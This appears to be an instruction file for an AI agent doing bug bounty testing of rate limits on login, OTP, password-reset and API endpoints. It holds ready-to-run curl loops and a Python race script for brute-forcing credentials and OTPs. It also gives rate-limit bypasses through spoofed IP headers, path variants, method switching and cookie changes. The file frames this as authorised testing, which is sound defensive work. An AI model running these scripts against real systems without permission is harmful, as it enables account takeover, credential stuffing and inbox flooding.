# Rate Limit Tester Agent

Test rate limiting on sensitive endpoints. Missing or bypassable rate limits on login, OTP, password reset, and API endpoints enable brute force attacks and account takeover.

## Prerequisites

```bash
which curl || apt install -y curl
which ffuf || go install github.com/ffuf/ffuf/v2@latest
which turbo-intruder || echo "Install via BApp Store in Burp Suite"
pip3 install asyncio aiohttp
```

## Phase 1: Identify Sensitive Endpoints

```bash
TARGET="https://target.com"

# Map authentication endpoints
ENDPOINTS=(
  "/login" "/signin" "/api/auth/login" "/api/v1/login"
  "/api/auth/signin" "/oauth/token"
  "/forgot-password" "/reset-password" "/api/password/reset"
  "/api/password/forgot" "/account/recover"
  "/verify-otp" "/api/verify" "/api/otp/verify"
  "/2fa/verify" "/mfa/verify"
  "/register" "/signup" "/api/auth/register"
  "/api/users" "/api/v1/users"
)

for EP in "${ENDPOINTS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$EP" -H "X-HackerOne-Research: $H1USER")
  [ "$CODE" != "404" ] && echo "LIVE: $EP ($CODE)"
done
```

## Phase 2: Login Brute Force Rate Limit Test

```bash
ENDPOINT="$TARGET/api/auth/login"

# Send 50 rapid requests with wrong credentials
for i in $(seq 1 50); do
  CODE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-HackerOne-Research: $H1USER" \
    -d '{"email":"test@test.com","password":"wrong'$i'"}' \
    -o /dev/null -w "%{http_code}")
  echo "Attempt $i: $CODE"
done

# If all return 200/401 (no 429), rate limiting is missing
# Note the request number where blocking starts (if ever)
```

## Phase 3: OTP Brute Force Test

```bash
ENDPOINT="$TARGET/api/verify-otp"

# 4-digit OTP = 10,000 possibilities
# 6-digit OTP = 1,000,000 possibilities
# Test if rate limiting prevents brute force

# Send 100 rapid OTP attempts
for i in $(seq 1 100); do
  OTP=$(printf "%06d" $i)
  CODE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-HackerOne-Research: $H1USER" \
    -d "{\"otp\":\"$OTP\",\"token\":\"$RESET_TOKEN\"}" \
    -o /dev/null -w "%{http_code}")
  echo "OTP $OTP: $CODE"
  [ "$CODE" = "429" ] && echo "RATE LIMITED at attempt $i" && break
done

# If no 429 after 100 attempts, 4-digit OTP is fully brute-forceable
```

## Phase 4: Password Reset Flood Test

```bash
ENDPOINT="$TARGET/api/password/reset"

# Test if password reset has rate limiting
for i in $(seq 1 30); do
  CODE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-HackerOne-Research: $H1USER" \
    -d '{"email":"your-test-account@example.com"}' \
    -o /dev/null -w "%{http_code}")
  echo "Reset request $i: $CODE"
done

# If all succeed: email flooding possible (DoS on user's inbox)
# If no lockout: brute force on reset tokens may be viable
```

## Phase 5: API Endpoint Rate Limits

```bash
# Test general API rate limits
ENDPOINT="$TARGET/api/v1/users/me"

# Burst test — 100 requests in rapid succession
for i in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code} " "$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-HackerOne-Research: $H1USER" &
done
wait
echo ""

# Check rate limit headers
curl -sk -D- "$ENDPOINT" -H "Authorization: Bearer $TOKEN" | \
  grep -iE "x-ratelimit|x-rate-limit|retry-after|ratelimit-"
```

## Phase 6: Bypass — X-Forwarded-For Rotation

```bash
ENDPOINT="$TARGET/api/auth/login"

# If rate limit is per-IP, rotate X-Forwarded-For
for i in $(seq 1 50); do
  IP="10.0.0.$((i % 255))"
  CODE=$(curl -sk -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $IP" \
    -H "X-Real-IP: $IP" \
    -H "X-Originating-IP: $IP" \
    -H "True-Client-IP: $IP" \
    -H "X-HackerOne-Research: $H1USER" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    -o /dev/null -w "%{http_code}")
  echo "XFF $IP -> $CODE"
done

# If no 429 while baseline (no XFF) gets 429, the bypass works
```

## Phase 7: Bypass — Endpoint Variation

```bash
ENDPOINT="/api/auth/login"

# Case variation — rate limit may be path-exact
VARIANTS=(
  "$ENDPOINT"
  "/Api/Auth/Login"
  "/API/AUTH/LOGIN"
  "/api/auth/login/"
  "/api/auth/login?"
  "/api/auth/login#"
  "/api/auth/login%20"
  "/api/auth/./login"
  "/api/auth/login;bypass"
  "//api//auth//login"
)

for V in "${VARIANTS[@]}"; do
  CODE=$(curl -sk -X POST "$TARGET$V" \
    -H "Content-Type: application/json" \
    -H "X-HackerOne-Research: $H1USER" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    -o /dev/null -w "%{http_code}")
  echo "$V -> $CODE"
done
```

## Phase 8: Bypass — Parameter Manipulation

```bash
# Add extra parameters to bypass rate limit keying
curl -sk -X POST "$TARGET/api/auth/login?cachebuster=1" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}'

# Switch HTTP method
curl -sk -X PUT "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}'

# Add/change Content-Type
curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'email=test@test.com&password=wrong'

# Cookie manipulation — remove session cookie or change it
curl -sk -X POST "$TARGET/api/auth/login" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=different_value_$RANDOM" \
  -d '{"email":"test@test.com","password":"wrong"}'
```

## Phase 9: Bypass — Race Condition (Parallel Requests)

```python
#!/usr/bin/env python3
"""Send N requests simultaneously to test if rate limit applies to parallel bursts."""
import asyncio, aiohttp, sys

TARGET = sys.argv[1]  # https://target.com/api/auth/login
N = int(sys.argv[2])  # number of parallel requests

async def send_request(session, i):
    async with session.post(TARGET, json={
        "email": "test@test.com",
        "password": f"wrong{i}"
    }, headers={"X-HackerOne-Research": "authorized"}, ssl=False) as resp:
        return i, resp.status

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, i) for i in range(N)]
        results = await asyncio.gather(*tasks)
        for i, status in sorted(results):
            print(f"Request {i}: {status}")
        blocked = sum(1 for _, s in results if s == 429)
        print(f"\n{blocked}/{N} blocked by rate limit")

asyncio.run(main())
```

```bash
python3 /tmp/rate_race.py "$TARGET/api/auth/login" 50
```

## Phase 10: Per-IP vs Per-Account Analysis

```bash
# Test: does rate limit track by IP, account, or both?

# Same IP, different accounts — if all get blocked, it's per-IP
for USER in user1@test.com user2@test.com user3@test.com; do
  for i in $(seq 1 20); do
    curl -sk -X POST "$TARGET/api/auth/login" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$USER\",\"password\":\"wrong\"}" \
      -o /dev/null -w "%{http_code} " &
  done
done
wait

# Same account, different IPs (via XFF) — if all get blocked, it's per-account
for i in $(seq 1 20); do
  curl -sk -X POST "$TARGET/api/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.$((RANDOM % 255)).$((RANDOM % 255))" \
    -d '{"email":"test@test.com","password":"wrong"}' \
    -o /dev/null -w "%{http_code} "
done
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| No rate limit on OTP (4-6 digit) — full brute force possible | Critical |
| No rate limit on login — credential stuffing possible | High |
| Rate limit bypassed via XFF/headers | High |
| No rate limit on password reset — email flood | Medium |
| Rate limit exists but threshold too high (>1000/min) | Medium |
| Rate limit missing on non-sensitive endpoints | Low |

## Output Format

For each finding:
1. **Endpoint**: URL and method
2. **Rate Limit Status**: Present/Missing/Bypassable
3. **Threshold**: At what request count does blocking start (if any)
4. **Bypass Method**: Which technique circumvented the limit
5. **Impact**: What attack this enables (brute force, credential stuffing, DoS)
6. **PoC**: Script or curl commands to reproduce

## Rules

- Use YOUR OWN test accounts, never target real user accounts
- Keep request volume reasonable — enough to prove the issue, not to cause DoS
- Include required bug bounty headers on all requests
- Log all test results for reporting
- Stop if you detect account lockout on real accounts
